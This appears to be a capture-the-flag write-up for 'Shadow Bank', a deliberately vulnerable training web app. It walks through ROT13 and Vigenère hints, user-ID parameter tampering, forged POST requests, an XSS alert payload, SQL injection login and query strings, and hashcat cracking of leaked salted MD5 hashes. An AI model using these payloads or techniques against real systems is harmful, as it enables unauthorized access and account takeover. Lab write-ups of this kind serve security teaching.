# Shadow Bank

Unlike Human resources website, you can just register on Shadow Bank.
Although after getting in, there is a lot of interesting stuff to do.

## Cipher

- Into the Shadows (Cryptanalysis of ROT13)
- Down the Rabbit Hole (cryptanalysis of Vigenere Cipher)

In the source code of the page you find
```
<!-- Jub'f yhexvat va gur funqbjf? Jub'f npghnyyl uvqvat haqre gubfr fpnel pybnxf? Jung'f tbvat ba ng /funqbjOnaxUD?  -->
```

Rotation of 13 produces

```
Who's lurking in the shadows? Who's actually hiding under those scary cloaks? What's going on at /shadowBankHQ?
```

There is also an interesting forum post.

```
kph flx fvob rvzvqho aymq le wre dotgv. qw ozsbmg jzsu-vdwfvvl, vkp xywxjsx: jblow mk pdg giig oryk ttdzd eel d jcirb pdyc kmhws, wf akh qicb wklx zb rxrlk br ep ximdwph nqwk cij xhfe. gymvktvv xxvd, wym ehree, zdwsii blpthcg, dv dlv llg ysk iw dwp bvrz hlvbkhc mk erxwh cqnh elv vdpp: lfehypv, zb rqwc xzlqyiu i olexcm zloii. krpp, mka sopejmg vz jrz, wkzyx pw dwmtm, dqo wym zhyx fv. zrfpu grx eict ph, apvivh, hlzkk zlc z wxjsx kw jr qvfu khci? kpdw oigmqgd e xwrg oirt rq hlvzh bzy niqw es xmw wz, wrqg wsi tiw. l oseb pxnl tiuh hlvzh— vlmu iolni. kphq tx uwhvyx diwwpv nplfs arg brf kf, adlo xym fde. —wf trqr ej q jhe wfuhzsiim, dotgv iggph ra dq pbgtdqlxzwq. rs, cfcuh dyim wr os kpdw, dezl wkp grb, li jsl wqoj artn ozrx mqrfky. iolni wmow elrb wktw twxoo rfb eh oieqhg, ds jph wcmvl dqzxymu tfijblry. ayiw vzvk wi spsgth otzv ierfx ymuh? tr kpdw omimfwtse, bkh nek adlo, ardlqr mka ulrlk xdz cslvg, otzva d klxkmu: dyh zv wklx uquhnxzwq, zlzzvj wsi fbkhc tre, olgij i pdcgy pdup. zzalw pmkphu jsl tlnp: xymbup ffbk plh. scw l oseb zdyx kw jr lqfvj plh gmrswi, rtlfp vvuduviu. wk, bzy tiqw sicx wklx, jilg elv kdw: hiim dow qrl khci. zu pdo. cfcuh xeu. prz os pwx nysn qp plh? jilg lpzkh. bzy dcvw mi, jilg elv kdw, zv pwx zzyclqw semm frxi ymuh. /dlrlrzmees/fkpwyquh
```

```
the cat only grinned when it saw alice. it looked good-natured, she thought: still it had very long claws and a great many teeth, so she felt that it ought to be treated with res pect. cheshire puss, she began, rather timidly, as she did not at all know whether it would like the name: however, it only grinned a little wider. come, its pleased so far, thoug ht alice, and she went on. would you tell me, please, which way i ought to go from here? that depends a good deal on where you want to get to, said the cat. i dont much care where— said alice. then it doesnt matter which way you go, said the cat. —so long as i get somewhere, alice added as an explanation. oh, youre sure to do that, said the cat, if you only walk long enough. alice felt that this could not be denied, so she tried another question. what sort of people live about here? in that direction, the cat said, waving its right paw round, lives a hatter: and in that direction, waving the other paw, lives a march hare. visit either you like: theyre both mad. but i dont want to go among mad people, alice remarked. oh, you cant help that, said the cat: were all mad here. im mad. youre mad. how do you know im mad? said alice. you must be, said the cat, or you wouldnt have come here. /shadowbank/cheshire
```

## Tampering Data
- View Other Users' Stocks (Query Parameter Manipulation)
- View Other Users' Currencies

Changing 'user' value
```
GET /ShadowBank/brokerageDetails?user=83247649 HTTP/1.1
GET /ShadowBank/brokerageDetails?user=83247644 HTTP/1.1
```
-  Make a forum post impersonating a Bank Official

```
POST /ShadowBank/newPost.action HTTP/1.1
postText=dicks%0D%0A&threadId=3&postedBy=1337dawg&staffPost=true
```
- Sell Stock You Don't Own

```
POST /ShadowBank/sell.action HTTP/1.1
quantity=1&stockId=1&stockPrice=10000000
```

## Injection

There is a sick XSS in stock search

- alert("XSS in Stock Search")

```HTML
<script>alert(1337)</script>
```

- Data Exfiltration through SQL Injection (forum)

You can also view all the posts on forum by inserting 'or 1=1'

`/ShadowBank/showThread.action?currentThreadID=1%20or%201=1`

- Log in with SQL injection

```
Username: test' or 'y
```

## Hash Cracking

>
Customers may also wish to purchase our "Secure Shield" package. For an additional $5.99/mo., we will salt your password with the string "abc123" before hashing it. This is a very complicated process that will make it extra-impossible for hackers to compromise your password. Or, for $16.99/mo., we offer the "Uncrackable" package; we'll salt your password with the string "as807135%#". This adds even more security, because long, random strings are more difficult to guess.
> - from About page


robots.txt looks like this

```
User-agent: *
Disallow: /
Disallow: /debug
```

From where you can dump some sick hashes by navigating to ``debug``

```
shadow	 a326311e36651f79b0dcd4dcda70228e	abc123
dt	     a441649fbaf4e42c513a4572f3db7e1e	abc123
pants      4b8f105f370310ddc137d141d350cf12	as807135%#
bither	 0d107d09f5bbe40cade3de5c71e9e9b7
peappend   b0f5b5df7fa2bb54e046d4287a0757ca
tiger      827ccb0eea8a706c4c34a16891f84e7b
boots      5ebe2294ecd0e0f08eab7690d2a6ee69
arnold	 asdgawegh
test	   addd03df13dc513f55ac3baa35fec7a5
loans	   hahanopassword
viggy	   nopass
1337dawg 202cb962ac59075b964b07152d234b70
```

MD5 hashes you crack without salt you can crack [here](https://crackstation.net)

 For the other one use hashcat type 10

 ```
 MacBook-Pro-Leo:trape-master Scream$ hashcat -a 0 -m 10 ~/Downloads/hashesBS.txt ~/hashcat/rockyou.txt

 a326311e36651f79b0dcd4dcda70228e:abc123:iamacat           
 a441649fbaf4e42c513a4572f3db7e1e:abc123:fluffykitten      
 4b8f105f370310ddc137d141d350cf12:as807135%#:meow          

 Session..........: hashcat
 Status...........: Cracked
 Hash.Type........: md5($pass.$salt)
 Hash.Target......: /Users/Scream/Downloads/hashesBS.txt
 Time.Started.....: Sun Nov 12 12:32:17 2017 (1 sec)
 Time.Estimated...: Sun Nov 12 12:32:18 2017 (0 secs)
 Input.Base.......: File (/Users/Scream/hashcat/rockyou.txt)
 Input.Queue......: 1/1 (100.00%)
 Speed.Dev.#2.....: 79941.4 kH/s (11.26ms)
 Recovered........: 3/3 (100.00%) Digests, 2/2 (100.00%) Salts
 Progress.........: 2621520/28686592 (9.14%)
 Rejected.........: 80/2621520 (0.00%)
 Restore.Point....: 0/14343296 (0.00%)
 Candidates.#2....: 123456 -> sayonara15
 ```
